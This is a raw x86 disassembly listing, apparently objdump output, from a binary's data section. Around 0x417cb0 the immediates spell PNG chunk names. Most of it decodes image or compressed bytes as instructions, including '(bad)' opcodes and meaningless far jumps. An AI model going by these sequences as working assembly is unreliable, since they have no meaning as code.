  417899:	and    esi,DWORD PTR [ebx]
  41789b:	and    edi,DWORD PTR [ebx]
  41789d:	das    
  41789e:	cmp    edi,DWORD PTR [ebx]
  4178a0:	cmp    esp,DWORD PTR [eax]
  4178a2:	xor    BYTE PTR [eax],al
  4178a4:	push   es
  4178a5:	xor    al,BYTE PTR [eax]
  4178a7:	push   ss
  4178a8:	xor    BYTE PTR [eax],dh
  4178aa:	xor    dh,BYTE PTR [edx]
  4178ac:	xor    BYTE PTR [edx],dh
  4178ae:	xor    dh,BYTE PTR [edx]
  4178b0:	xor    BYTE PTR [eax],dh
  4178b2:	add    DWORD PTR [ebx-0x111e427d],0x12
  4178b9:	xor    al,0x4e
  4178bb:	dec    esp
  4178bc:	sub    ch,bh
  4178be:	add    BYTE PTR [eax],al
  4178c0:	add    BYTE PTR [esi+eax*8],bh
  4178c3:	retf   
  4178c4:	leave  
  4178c5:	mov    ecx,0xebcbadba
  4178ca:	(bad)
  4178cd:	in     eax,dx
  4178ce:	(bad)  
  4178d0:	(bad)  
  4178d2:	fucomip st,st(0)
  4178d4:	(bad)  
  4178d5:	retf   
  4178d6:	leave  
  4178d7:	(bad)  
  4178d8:	retf   
  4178d9:	mov    edi,0xc7c6c6bf
  4178de:	(bad)  
  4178df:	aad    0xd7
  4178e1:	xlat   BYTE PTR ds:[ebx]
  4178e2:	fcmovnb st,st(4)
  4178e4:	mov    esi,0x4411f7cb
  4178e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178ea:	mov    ecx,0x344401b3
  4178ef:	sub    dh,BYTE PTR [ebx]
  4178f1:	sub    ch,BYTE PTR [edx]
  4178f3:	sub    dh,BYTE PTR [ebx]
  4178f5:	and    BYTE PTR [ebx],dh
  4178f7:	cmp    edi,DWORD PTR [ebx]
  4178f9:	cmp    esp,DWORD PTR [ebx]
  4178fb:	dec    esi
  4178fc:	and    ebp,DWORD PTR [edx]
  4178fe:	push   es
  4178ff:	xor    al,BYTE PTR [eax]
  417901:	push   ss
  417902:	xor    BYTE PTR [eax],dh
  417904:	xor    eax,0x3230323a
  417909:	xor    dh,BYTE PTR [edx]
  41790b:	sub    al,0x83
  41790d:	add    DWORD PTR [ebp+0x78],0xfffffff9
  417911:	adc    bh,BYTE PTR [ebx]
  417913:	dec    esi
  417914:	dec    esp
  417915:	dec    esp
  417916:	dec    esp
  417917:	push   ecx
  417918:	add    BYTE PTR [eax],al
  41791a:	add    BYTE PTR [edx],dl
  41791c:	(bad)  
  41791d:	mov    edi,0xc6c9b9bf
  417922:	(bad)  
  417923:	enter  0xd8df,0xdf
  417927:	(bad)  
  417929:	(bad)  
  41792b:	(bad)
  41792e:	pop    es
  41792f:	mov    BYTE PTR [eax],0x1d
  417932:	leave  
  417933:	mov    dh,0xc4
  417936:	xlat   BYTE PTR ds:[ebx]
  417937:	aad    0xeb
  417939:	(bad)  
  41793a:	mov    bh,0xbf
  41793d:	mov    edi,0xb3b6dab8
  417942:	fisubr DWORD PTR [esi+0x2a4e357f]
  417948:	and    BYTE PTR [edx],ch
  41794a:	sub    ch,BYTE PTR [ecx]
  41794c:	sub    cl,BYTE PTR [ebx+esi*1+0x0]
  417950:	add    al,0x3b
  417952:	add    BYTE PTR [ebx],al
  417954:	dec    esi
  417955:	sub    dh,BYTE PTR [eax]
  417957:	add    BYTE PTR ds:0x30160032,al
  41795d:	xor    ch,BYTE PTR [eax]
  41795f:	xor    dh,BYTE PTR [edx]
  417961:	xor    BYTE PTR [edx],dh
  417963:	xor    dh,BYTE PTR [edx]
  417965:	cmp    BYTE PTR [edx+0x37ef8383],cl
  41796b:	pop    ebp
  41796c:	pop    ebp
  41796d:	cmp    ecx,DWORD PTR [esp+ecx*2+0x4c]
  417971:	dec    esp
  417972:	add    BYTE PTR [eax],al
  417974:	add    BYTE PTR [eax-0x37],bl
  417977:	retf   
  417978:	mov    ecx,0xc8d7bfcb
  41797d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797e:	stos   BYTE PTR es:[edi],al
  41797f:	cmc    
  417980:	(bad)  
  417982:	(bad)  
  417984:	fsubrp st(6),st
  417986:	(bad)
  417989:	jmp    0x417960
  41798b:	(bad)  
  41798c:	mov    dh,0xc4
  41798f:	mov    dh,0xc6
  417992:	mov    bh,0xc7
  417994:	jmp    0x41795a
  417996:	(bad)  
  417997:	mov    edi,0xbac9b9e0
  41799c:	mov    ecx,0xd0b5b2b9
  4179a1:	pusha  
  4179a2:	sbb    DWORD PTR [edx],ebp
  4179a4:	xor    ebp,DWORD PTR [edx]
  4179a6:	sub    bl,BYTE PTR [ecx]
  4179a8:	xor    BYTE PTR [edx],dh
  4179aa:	xor    dh,BYTE PTR [eax]
  4179ac:	sbb    BYTE PTR [ebx],bh
  4179ae:	dec    esi
  4179af:	and    BYTE PTR [edx+ebp*1+0x30],cl
  4179b3:	xor    dh,BYTE PTR [edx]
  4179b5:	xor    dh,BYTE PTR [eax]
  4179b7:	xor    BYTE PTR [edx+0x32],al
  4179ba:	xor    ch,BYTE PTR [eax]
  4179bc:	xor    dh,BYTE PTR [edx]
  4179be:	xor    ch,BYTE PTR [eax]
  4179c0:	sub    al,0x8a
  4179c2:	mov    eax,DWORD PTR [ebx+0x2f2bbd8a]
  4179c8:	cmp    ebx,DWORD PTR [ebx+0x4e]
  4179cb:	dec    esp
  4179cc:	dec    esp
  4179cd:	dec    esp
  4179ce:	add    BYTE PTR [eax],al
  4179d0:	add    BYTE PTR [eax],cl
  4179d2:	retf   
  4179d3:	mov    ecx,0xe6c8c6c9
  4179d8:	fsubr  DWORD PTR [edx+0x4c00df04]
  4179de:	(bad)  
  4179e0:	ffreep st(5)
  4179e2:	(bad)
  4179e5:	mov    edi,0xc6c7c4c7
  4179eb:	(bad)  
  4179ec:	mov    edi,0xc7ebc6c6
  4179f1:	jmp    0xbaba:0xb9b9cbc9
  4179f8:	mov    ch,0xb5
  4179fa:	mov    ch,0xb2
  4179fc:	mov    bl,0xef
  4179fe:	pop    ebx
  4179ff:	dec    esi
  417a00:	sub    ch,BYTE PTR [edx]
  417a02:	sub    dh,BYTE PTR [eax]
  417a04:	xor    dh,BYTE PTR [eax]
  417a06:	xor    al,BYTE PTR [edx+0x4c]
  417a09:	sub    cl,BYTE PTR [eax+eiz*1+0x2a]
  417a0d:	sub    DWORD PTR [eax],esi
  417a0f:	inc    edx
  417a10:	xor    dh,BYTE PTR [edx]
  417a12:	xor    dh,BYTE PTR [esi]
  417a14:	xor    dh,BYTE PTR [edx]
  417a16:	sub    BYTE PTR [edx],dh
  417a18:	sub    BYTE PTR [edx],dh
  417a1a:	sub    BYTE PTR ds:0x8386836f,dh
  417a20:	mov    BYTE PTR [eax+0x56],dl
  417a23:	pop    ebp
  417a24:	pop    ebx
  417a25:	dec    esi
  417a26:	dec    esp
  417a27:	dec    esp
  417a28:	dec    esp
  417a29:	dec    esp
  417a2a:	add    BYTE PTR [eax],al
  417a2c:	add    BYTE PTR [edi],dh
  417a2e:	mov    ecx,0xdfe9c6cb
  417a33:	fdiv   st,st(5)
  417a35:	fcomp  st(7)
  417a37:	(bad)  
  417a39:	(bad)  
  417a3b:	(bad)  
  417a3d:	fucomip st,st(0)
  417a3f:	aad    0xd5
  417a41:	mov    esp,0xc6c4c6c4
  417a47:	leave  
  417a48:	test   bl,0xc6
  417a4b:	(bad)  
  417a4c:	jmp    0xadba:0xb9b8c6c6
  417a53:	mov    ch,0xb5
  417a55:	mov    ch,0xb2
  417a57:	mov    bl,0xb3
  417a59:	mov    ebp,0x2a5b7b82
  417a5e:	sub    bl,BYTE PTR [ecx]
  417a60:	xor    BYTE PTR [edx],dh
  417a62:	xor    dh,BYTE PTR [edx]
  417a64:	xor    eax,0x2a0400
  417a69:	sbb    eax,0x42323230
  417a6e:	inc    edx
  417a6f:	dec    edx
  417a70:	pop    edi
  417a71:	addr16 inc edx
  417a73:	xor    ch,BYTE PTR [eax]
  417a75:	xor    ch,BYTE PTR [eax]
  417a77:	xor    dh,BYTE PTR [esi-0x75]
  417a7a:	cmp    DWORD PTR [eax],0xffffff8a
  417a7d:	xchg   BYTE PTR [eax+0x56],dl
  417a80:	pop    ebp
  417a81:	dec    esi
  417a82:	dec    esi
  417a83:	pop    ebx
  417a84:	dec    esp
  417a85:	dec    esp
  417a86:	push   ecx
  417a87:	add    BYTE PTR [eax],al
  417a89:	add    BYTE PTR [eax],al
  417a8b:	pop    eax
  417a8c:	lods   eax,DWORD PTR ds:[esi]
  417a8d:	retf   
  417a8e:	call   0xe01a5371
  417a93:	(bad)  
  417a95:	(bad)  
  417a97:	fsubrp st(6),st
  417a99:	(bad)  
  417a9b:	fsubp  st(1),st
  417a9d:	xlat   BYTE PTR ds:[ebx]
  417a9e:	mov    bh,0xc6
  417aa1:	mov    dh,0xbf
  417aa4:	leave  
  417aa5:	test   cl,0xc6
  417aa8:	mov    edi,0xc9e0bfc6
  417aad:	leave  
  417aae:	mov    ecx,0xb5b5b8ba
  417ab3:	mov    dl,0xb2
  417ab5:	mov    dl,0xb3
  417ab7:	nop
  417ab8:	cmp    BYTE PTR [ebx+0x7b],0x5b
  417abc:	sub    ch,BYTE PTR [ecx]
  417abe:	xor    BYTE PTR [eax],dh
  417ac0:	xor    dh,BYTE PTR [edx]
  417ac2:	xor    BYTE PTR [esp+ebp*1],ch
  417ac5:	inc    edx
  417ac6:	sub    DWORD PTR [ecx+0x30],esp
  417ac9:	xor    al,BYTE PTR [edx+0x32]
  417acc:	pop    ecx
  417acd:	std    
  417ace:	jg     0x417b06
  417ad0:	xor    al,BYTE PTR [edx+0x30]
  417ad3:	xor    BYTE PTR [eax],dh
  417ad5:	inc    ebp
  417ad6:	add    DWORD PTR [ebx+0x76888a83],0x2f
  417add:	pop    ebp
  417ade:	dec    esi
  417adf:	dec    esp
  417ae0:	dec    esp
  417ae1:	push   ecx
  417ae2:	push   ecx
  417ae3:	push   ecx
  417ae4:	add    BYTE PTR [eax],al
  417ae6:	add    BYTE PTR [ebx],dh
  417ae8:	mov    ds:0xd8d8dfe8,eax
  417aed:	(bad)  
  417aef:	(bad)  
  417af1:	(bad)  
  417af3:	(bad)  
  417af5:	fcomp  st(7)
  417af7:	jmp    0xcc0842e4
  417afc:	mov    edi,0xcbbfcbcb
  417b01:	leave  
  417b02:	mov    edi,0xbfe0c9bf
  417b07:	mov    edi,0xbab9b9c9
  417b0c:	mov    ch,0xba
  417b0e:	mov    ch,0xb5
  417b10:	mov    dl,0xb2
  417b12:	mov    bl,0xc2
  417b14:	jnp    0x417b8b
  417b16:	popa   
  417b17:	jnp    0x417b74
  417b19:	popa   
  417b1a:	xor    al,BYTE PTR [eax]
  417b1c:	add    al,0x30
  417b1e:	add    BYTE PTR [ecx],ah
  417b20:	cmp    BYTE PTR [esp+eax*2+0x35],ah
  417b24:	xor    BYTE PTR [edx],dh
  417b26:	xor    al,BYTE PTR [edx+0x42]
  417b29:	add    DWORD PTR fs:[ecx+0x40],eax
  417b2d:	inc    edx
  417b2e:	xor    dh,BYTE PTR [edx]
  417b30:	sub    DWORD PTR [edi+ebp*2-0x7d],ebx
  417b34:	or     DWORD PTR [edx+0x3b8b8488],0x5b
  417b3b:	dec    esi
  417b3c:	dec    esp
  417b3d:	dec    esp
  417b3e:	push   ecx
  417b3f:	dec    esp
  417b40:	push   ecx
  417b41:	add    BYTE PTR [eax],al
  417b43:	add    BYTE PTR [eax],al
  417b45:	and    DWORD PTR [esi-0x2727271a],esp
  417b4b:	(bad)  
  417b4d:	retf   0xdfde
  417b50:	(bad)  
  417b52:	fcomp  st(7)
  417b54:	(bad)  
  417b56:	jmp    0x417b1f
  417b58:	mov    edi,0xb9cbc9cb
  417b5d:	mov    ecx,0xb9c9b9c9
  417b62:	retf   
  417b63:	leave  
  417b64:	leave  
  417b65:	mov    ecx,0xba0400b9
  417b6a:	add    BYTE PTR [ebx],al
  417b6c:	mov    ch,0xb5
  417b6e:	mov    ch,0x0
  417b70:	add    al,0xb3
  417b72:	add    eax,0x610a0075
  417b77:	popa   
  417b78:	sbb    DWORD PTR [edx],esi
  417b7a:	xor    eax,0x8e572c2a
  417b7f:	arpl   WORD PTR [edx+esi*1],ax
  417b82:	add    BYTE PTR [ecx],bl
  417b84:	inc    edx
  417b85:	inc    eax
  417b86:	jle    0x417b11
  417b88:	inc    eax
  417b89:	xor    al,BYTE PTR [edx+0x32]
  417b8c:	sub    ch,BYTE PTR [edi-0x7d]
  417b8f:	add    DWORD PTR [ebx+0x707a8888],0x5d
  417b96:	pop    ebx
  417b97:	dec    esi
  417b98:	dec    esp
  417b99:	dec    esp
  417b9a:	dec    esp
  417b9b:	push   ecx
  417b9c:	dec    esp
  417b9d:	add    BYTE PTR [eax],al
  417b9f:	add    BYTE PTR [eax],al
  417ba1:	pop    ss
  417ba2:	fcomip st,st(5)
  417ba4:	fcomp  st(7)
  417ba6:	fsubr  DWORD PTR [edx-0x213a5956]
  417bac:	out    0xde,al
  417bae:	fcomp  st(7)
  417bb0:	enter  0xc7e8,0xbf
  417bb4:	retf   
  417bb5:	mov    ecx,0xcbb9b9
  417bba:	add    al,0xb9
  417bbc:	add    BYTE PTR [edi],al
  417bbe:	leave  
  417bbf:	mov    ecx,0xadbab9b9
  417bc4:	mov    edx,0xb50600
  417bc9:	xor    BYTE PTR [edx+0x76b3b3b2],dh
  417bcf:	jne    0x417c46
  417bd1:	jne    0x417c34
  417bd3:	jne    0x417c36
  417bd5:	popa   
  417bd6:	xor    dh,BYTE PTR [edx]
  417bd8:	sub    DWORD PTR [eax+0x41],eax
  417bdb:	std    
  417bdc:	pop    edi
  417bdd:	inc    edx
  417bde:	inc    edx
  417bdf:	xor    BYTE PTR [edx+0x32],al
  417be2:	dec    eax
  417be3:	dec    edx
  417be4:	pop    edi
  417be5:	ss xor dh,BYTE PTR ss:[edx]
  417be9:	xor    eax,0x8a45836f
  417bee:	mov    BYTE PTR [ebp+0x4e585fa4],al
  417bf4:	dec    esp
  417bf5:	dec    esp
  417bf6:	dec    esp
  417bf7:	push   ecx
  417bf8:	push   ecx
  417bf9:	cmp    al,BYTE PTR [eax]
  417bfb:	add    BYTE PTR [eax],al
  417bfd:	pop    ss
  417bfe:	stos   BYTE PTR es:[edi],al
  417bff:	fcomp  st(7)
  417c01:	fcomp  st(7)
  417c03:	fbld   TBYTE PTR [esi-0x2120205d]
  417c09:	ffreep st(5)
  417c0b:	retf   0xc7e8
  417c0e:	retf   
  417c0f:	retf   
  417c10:	scas   eax,DWORD PTR es:[edi]
  417c11:	leave  
  417c12:	mov    ecx,0x600bab9
  417c17:	mov    ecx,0xadba0300
  417c1c:	mov    edx,0xb50700
  417c21:	xor    DWORD PTR [edx-0x4c4c4d4e],esi
  417c27:	mov    esi,DWORD PTR [ebp+0x75]
  417c2a:	jne    0x417c95
  417c2c:	data16 jne 0x417ca4
  417c2f:	dec    esp
  417c30:	xor    eax,0x92403230
  417c35:	gs imul esi,DWORD PTR ss:[edx],0x42424232
  417c3d:	ss inc edx
  417c3f:	inc    edx
  417c40:	xor    DWORD PTR [edx],esi
  417c42:	pop    esp
  417c43:	mov    cl,BYTE PTR [edx-0x5b7a7c76]
  417c49:	ins    BYTE PTR es:[edi],dx
  417c4a:	je     0x417c8c
  417c4c:	dec    esp
  417c4d:	dec    esp
  417c4e:	dec    esp
  417c4f:	push   ecx
  417c50:	push   ecx
  417c51:	push   ecx
  417c52:	push   ecx
  417c53:	add    BYTE PTR [eax],al
  417c55:	add    BYTE PTR [eax],al
  417c57:	adc    al,0xaa
  417c59:	fsub   st,st(6)
  417c5b:	(bad)
  417c5e:	stos   BYTE PTR es:[edi],al
  417c5f:	retf   0xdfde
  417c62:	ffreep st(5)
  417c64:	jmp    0xcc0d4440
  417c69:	leave  
  417c6a:	leave  
  417c6b:	mov    edx,0xba01b909
  417c70:	add    DWORD PTR [edx+0x1a00b506],edi
  417c76:	mov    dl,0xb5
  417c78:	mov    ch,0xb3
  417c7a:	mov    bl,0xb6
  417c7c:	mov    bl,0x90
  417c7e:	jne    0x417ce9
  417c80:	jne    0x417cf7
  417c82:	imul   esp,DWORD PTR [esi+0x75],0x32306675
  417c89:	ss inc esp
  417c8b:	inc    esp
  417c8c:	xor    DWORD PTR ds:[edx+0x32],eax
  417c90:	or     BYTE PTR [edx+0x0],al
  417c93:	adc    DWORD PTR [ebp-0x76],eax
  417c96:	mov    BYTE PTR [edx+esi*2-0x7f8c8cbb],al
  417c9d:	push   edi
  417c9e:	inc    edx
  417c9f:	sub    BYTE PTR [ecx+0x51],dl
  417ca2:	push   ecx
  417ca3:	imul   ecx,DWORD PTR [ebx+0x0],0x100
  417caa:	push   eax
  417cab:	inc    ecx
  417cac:	mov    DWORD PTR [eax+0x4e],edx
  417caf:	inc    edi
  417cb0:	or     eax,0xa1a0a
  417cb5:	add    BYTE PTR [eax],al
  417cb7:	or     eax,0x52444849
  417cbc:	add    BYTE PTR [eax],al
  417cbe:	add    DWORD PTR [eax],eax
  417cc0:	add    BYTE PTR [eax],al
  417cc2:	add    DWORD PTR [eax],eax
  417cc4:	or     BYTE PTR [esi],al
  417cc6:	add    BYTE PTR [eax],al
  417cc8:	add    BYTE PTR [edx+esi*2-0x58],bl
  417ccc:	data16 add BYTE PTR [eax],al
  417ccf:	and    BYTE PTR [eax],al
  417cd1:	dec    ecx
  417cd2:	inc    esp
  417cd3:	inc    ecx
  417cd4:	push   esp
  417cd5:	js     0x417c73
  417cd7:	in     al,dx
  417cd8:	mov    ebp,0xf764b079
  417cdd:	jne    0x417cbe
  417cdf:	idiv   DWORD PTR [ecx]
  417ce1:	mov    edi,0xbd6eefdf
  417ce6:	mov    esi,0x2b32de6d
  417ceb:	xor    BYTE PTR [ebx],dh
  417ced:	sbb    BYTE PTR [eax+esi*1],cl
  417cf0:	add    al,0x9
  417cf2:	add    bl,ah
  417cf4:	inc    eax
  417cf5:	mov    dh,BYTE PTR [eax+ebp*1]
  417cf8:	push   edx
  417cf9:	xchg   esp,eax
  417cfa:	sub    BYTE PTR [ebx],ch
  417cfc:	mov    ch,BYTE PTR [ecx]
  417cfe:	xchg   DWORD PTR [edx-0x325a26d3],ecx
  417d04:	pop    edx
  417d05:	retf   0x4a72
  417d08:	and    eax,0x9524a585
  417d0d:	aas    
  417d0e:	add    al,0xfd
  417d10:	adc    DWORD PTR [ebx+0x492bb2e2],edi
  417d16:	push   ebp
  417d17:	mov    ds:0x2397224a,al
  417d1c:	cmp    esi,DWORD PTR [edx-0x3b]
  417d1f:	and    ch,BYTE PTR [ebp-0x76d375a8]
  417d25:	adc    al,0x45
  417d27:	adc    DWORD PTR [eax+ecx*1],esp
  417d2a:	nop
  417d2b:	add    BYTE PTR [ecx],dh
  417d2d:	les    esi,FWORD PTR [esi]
  417d2f:	xor    eax,eax
  417d31:	lods   al,BYTE PTR ds:[esi]
  417d32:	cwde   
  417d33:	in     eax,0xcd
  417d35:	fcmovnu st,st(7)
  417d37:	jmp    0x417d30
  417d39:	jp     0x417cf8
  417d3b:	jge    0x417d2c
  417d3d:	std    
  417d3e:	std    
  417d3f:	jle    0x417d3a
  417d41:	jecxz  0x417d39
  417d43:	fwait
  417d44:	sbb    DWORD PTR [esi+eax*1-0x76f4f720],ecx
  417d4b:	gs dec esi
  417d4d:	aad    0x7b
  417d4f:	fnstsw WORD PTR [ebp-0x45]
  417d52:	out    dx,eax
  417d53:	in     eax,dx
  417d54:	out    dx,al
  417d55:	jnp    0x417d52
  417d57:	jl     0x417d28
  417d59:	cmp    edi,ebx
  417d5b:	mov    bl,0xfc
  417d5d:	fs jno 0x417dd1
  417d60:	xchg   ecx,eax
  417d61:	pop    ebx
  417d62:	repnz frstor [ebp+0x76]
  417d66:	jbe    0x417dbe
  417d68:	xchg   esi,eax
  417d69:	xchg   esi,eax
  417d6a:	xchg   esi,eax
  417d6b:	cld    
  417d6c:	mov    ch,0x8f
  417d6e:	add    DWORD PTR [esi-0x4c],ebp
  417d71:	ins    DWORD PTR es:[edi],dx
  417d72:	jnp    0x417d6f
  417d74:	mov    ch,0x8f
  417d76:	outs   dx,DWORD PTR ds:[esi]
  417d77:	push   esi
  417d78:	pop    esi
  417d79:	outs   dx,BYTE PTR ds:[esi]
  417d7a:	mov    edi,0x3f6fb7eb
  417d7f:	fidivr WORD PTR [esi-0x1]
  417d82:	jmp    0x417dc3
  417d84:	fild   QWORD PTR ds:0x233725b9
  417d8a:	jb     0x417d97
  417d8c:	add    BYTE PTR [esi+0x68af5cbb],bh
  417d92:	fucomip st,st(7)
  417d94:	iret   
  417d95:	add    ebp,DWORD PTR [edi]
  417d97:	add    eax,0x8c025780
  417d9c:	pop    ebx
  417d9d:	mov    al,ds:0x495e4b70
  417da2:	aam    0xf7
  417da4:	sti    
  417da5:	add    edi,DWORD PTR [ecx+ebx*1+0x56767665]
  417dac:	mov    dh,0x95
  417dae:	jmp    0x7cfd:0xaf656acd
  417db5:	xlat   BYTE PTR ds:[ebx]
  417db6:	aas    
  417db7:	ja     0x417db6
  417db9:	addr16 mov esp,0xfdaf6bd1
  417dbf:	mov    ?,WORD PTR [edi-0x48d4621c]
  417dc5:	add    al,ah
  417dc7:	cmp    bl,cl
  417dc9:	push   esi
  417dca:	bnd jmp 0x417e2a
  417dcd:	sti    
  417dce:	push   edi
  417dcf:	push   edx
  417dd0:	mov    eax,0xaf5c9b37
  417dd5:	call   0xe62f3509
  417dda:	push   ds
  417ddb:	fist   WORD PTR [edx+0xadc8e77]
  417de1:	add    DWORD PTR [esi+0x72],eax
  417de4:	mov    ebp,0x17377c12
  417de9:	sti    
  417dea:	lods   eax,DWORD PTR ds:[esi]
  417deb:	sub    al,0x2f
  417ded:	out    0xc5,eax
  417def:	mov    esp,0x5b9c3c99
  417df4:	repnz mov ebp,0x7947791
  417dfa:	jo     0x417e2f
  417dfc:	scas   al,BYTE PTR es:[edi]
  417dfd:	lock cmc 
  417dff:	mov    cl,0xfe
  417e01:	fisttp DWORD PTR [ebp-0x7]
  417e04:	loope  0x417dab
  417e06:	fucomip st,st(5)
  417e08:	inc    esi
  417e09:	mov    eax,ds:0xe7792dce
  417e0e:	enter  0xda3b,0x3
  417e12:	js     0x417e4d
  417e14:	stos   DWORD PTR es:[edi],eax
  417e15:	inc    DWORD PTR [esi]
  417e17:	mov    ebp,0xa72f009d
  417e1c:	pusha  
  417e1d:	fucomi st,st(7)
  417e1f:	jns    0x417dc4
  417e21:	out    0x5f,eax
  417e23:	imul   edi,DWORD PTR [edi-0x251b229],0xce466fee
  417e2d:	jecxz  0x417dc5
  417e2f:	mov    esp,0xf18ef231
  417e34:	add    BYTE PTR [esi-0x3a],ch
  417e37:	mov    ds:0x2fca0ebf,al
  417e3c:	xlat   BYTE PTR ds:[ebx]
  417e3d:	fmul   st(2),st
  417e3f:	jne    0x417e1c
  417e41:	std    
  417e42:	jne    0x417dd3
  417e44:	scas   eax,DWORD PTR es:[edi]
  417e45:	std    
  417e46:	repz mov ds:0xbfbd1bbf,eax
  417e4c:	mov    edi,0xdfeb9f66
  417e51:	out    0x75,eax
  417e53:	xchg   ebx,eax
  417e54:	pop    ebx
  417e55:	add    al,0xe1
  417e57:	cmp    edx,DWORD PTR [ebx-0x22]
  417e5a:	mov    dh,0x1e
  417e5c:	shl    BYTE PTR [ebp-0xf84132a],0x63
  417e63:	jle    0x417e9e
  417e65:	sub    edi,DWORD PTR [ebp-0x53]
  417e68:	gs jg  0x417e98
  417e6b:	lahf   
  417e6c:	loope  0x417e29
  417e6e:	add    ebx,0x21e87915
  417e74:	test   BYTE PTR [edi-0x24b808ba],al
  417e7a:	mov    esi,0x8c2f85f0
  417e7f:	idiv   ch
  417e81:	in     al,dx
  417e82:	retf   
  417e83:	sbb    al,0xfe
  417e85:	or     esp,ebp
  417e87:	mov    bl,0x9f
  417e89:	std    
  417e8a:	lods   al,BYTE PTR ds:[esi]
  417e8b:	mov    edi,0x7dd1bf76
  417e90:	jg     0x417e5d
  417e92:	or     edi,DWORD PTR [eax-0x5]
  417e95:	retf   0x1adb
  417e98:	add    dh,bl
  417e9a:	rcr    ah,0xfd
  417e9d:	lea    ebp,[edx+edi*1]
  417ea0:	mov    esp,0xb97f4576
  417ea5:	idiv   DWORD PTR [ecx+0x3d0f7ef2]
  417eab:	hlt    
  417eac:	adc    BYTE PTR [edi+0x1e],al
  417eaf:	jp     0x417ef9
  417eb1:	add    BYTE PTR [esi],bh
  417eb3:	or     edi,esi
  417eb5:	loope  0x417e3e
  417eb7:	push   ecx
  417eb8:	stos   DWORD PTR es:[edi],eax
  417eb9:	psrad  mm6,QWORD PTR [edi-0x80]
  417ebd:	pushf  
  417ebe:	cmp    bh,BYTE PTR [edx+0x54]
  417ec1:	push   ss
  417ec2:	out    dx,eax
  417ec3:	mov    edi,0x3d1dcfdf
  417ec8:	sub    dh,BYTE PTR [eax+0x3f]
  417ecb:	add    BYTE PTR [ebx],cl
  417ecd:	icebp  
  417ece:	icebp  
  417ecf:	shl    edi,1
  417ed1:	cmp    DWORD PTR [edx],eax
  417ed3:	rol    dh,0xc5
  417ed6:	xor    ebp,DWORD PTR [edi]
  417ed8:	stc    
  417ed9:	jl     0x417eee
  417edb:	jnp    0x417eec
  417edd:	mov    ?,WORD PTR [esi+0x760071c7]
  417ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ee4:	inc    edi
  417ee5:	cmp    al,0xc0
  417ee7:	(bad)  
  417ee8:	out    0x61,eax
  417eea:	iret   
  417eeb:	or     DWORD PTR [edi],0xffffffc2
  417eee:	ret    
  417eef:	rol    BYTE PTR [ebx+0x1b7e0038],0x7e
  417ef6:	jmp    0x417eaf
  417ef8:	lock fild DWORD PTR [edi]
  417efb:	pop    eax
  417efc:	mov    esp,0x796f0c05
  417f01:	jns    0x417ede
  417f03:	add    al,al
  417f05:	mov    ch,0xf2
  417f07:	cmp    al,BYTE PTR [edx]
  417f09:	shl    BYTE PTR [ebp+0x6519b9c7],0x97
  417f10:	sbb    edi,DWORD PTR [esi+ebp*8+0xdfd2e46]
  417f17:	(bad)  
  417f18:	stc    
  417f19:	test   DWORD PTR [edi],ebp
  417f1b:	add    BYTE PTR [edi+0x3c82cf85],bl
  417f21:	cld    
  417f22:	xor    al,dh
  417f24:	and    BYTE PTR [edx+edi*1-0x38387376],bl
  417f2b:	add    eax,0x3d50b08e
  417f30:	scas   eax,DWORD PTR es:[edi]
  417f31:	push   es
  417f32:	xrelease mov DWORD PTR [esi-0x3e0732b1],ebp
  417f39:	clc    
  417f3a:	mov    dl,0xb4
  417f3c:	out    0x7,al
  417f3e:	push   0x4a
  417f40:	imul   ebx,DWORD PTR [ecx],0x18
  417f43:	and    eax,0x11d06150
  417f48:	xor    ecx,eax
  417f4a:	stos   BYTE PTR es:[edi],al
  417f4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f4c:	dec    edx
  417f4d:	or     DWORD PTR [eax-0x5a],eax
  417f50:	xchg   ebp,eax
  417f51:	inc    eax
  417f52:	enter  0x6014,0x55
  417f56:	es fst st(1)
  417f59:	sti    
  417f5a:	test   dh,dl
  417f5c:	jnp    0x417ee6
  417f5e:	rol    BYTE PTR [ebx+0x7cd6d494],1
  417f64:	mov    esp,0xceb17bc3
  417f69:	daa    
  417f6a:	(bad)  
  417f6b:	jns    0x417f40
  417f6d:	lds    ebp,FWORD PTR [edi+0x4d5772d7]
  417f73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f74:	cld    
  417f75:	repnz repnz xor dh,BYTE PTR [ebx]
  417f79:	adc    eax,0x2ec27ed0
  417f7e:	dec    ebp
  417f7f:	neg    ebp
  417f81:	push   ebx
  417f82:	(bad)  
  417f83:	jmp    0x788e:0x471db95f
  417f8a:	mov    esi,0x9c8e4700
  417f8f:	lock paddw mm2,mm6
  417f93:	outs   dx,DWORD PTR ds:[esi]
  417f94:	stc    
  417f95:	pop    ebx
  417f96:	mov    al,ds:0xb792d6f0
  417f9b:	or     eax,0xcb9cbc00
  417fa0:	jmp    FWORD PTR [edx]
  417fa2:	inc    ebx
  417fa3:	sub    bl,0x2d
  417fa6:	out    dx,eax
  417fa7:	int    0xec
  417fa9:	jmp    FWORD PTR [edx-0xa]
  417fac:	jns    0x417f37
  417fae:	cmp    al,0xc
  417fb0:	repnz and BYTE PTR [eax-0xc],dh
  417fb4:	call   0xfc40610a
  417fb9:	cmp    DWORD PTR [edi+0x1c],esi
  417fbc:	test   eax,0x9ba5a785
  417fc1:	and    al,0x6a
  417fc3:	mov    ecx,0xa515281f
  417fc8:	xchg   edx,eax
  417fc9:	sub    BYTE PTR ds:0x62a31d2b,ah
  417fcf:	popf   
  417fd0:	enter  0x67b0,0x83
  417fd4:	xchg   ebp,eax
  417fd5:	push   esi
  417fd6:	stos   DWORD PTR es:[edi],eax
  417fd7:	mov    dh,0x39
  417fd9:	(bad)  
  417fdb:	xchg   edi,eax
  417fdc:	jne    0x417f69
  417fde:	mov    ebp,0xe9d8a0d9
  417fe3:	popf   
  417fe4:	lahf   
  417fe5:	idiv   al
  417fe7:	dec    ecx
  417fe8:	test   DWORD PTR [ecx+ebp*2-0x5597e45d],ecx
  417fef:	pop    esi
  417ff0:	test   eax,0xabad2aa
  417ff5:	adc    ch,BYTE PTR [ecx]
  417ff7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ff8:	add    dl,BYTE PTR [ecx]
  417ffa:	pop    ds
  417ffb:	jnp    0x41800e
  417ffd:	lea    eax,[edi-0x1d]
  418000:	icebp  
  418001:	js     0x417ff2
  418003:	lods   al,BYTE PTR ds:[esi]
  418004:	mov    ch,0xb9
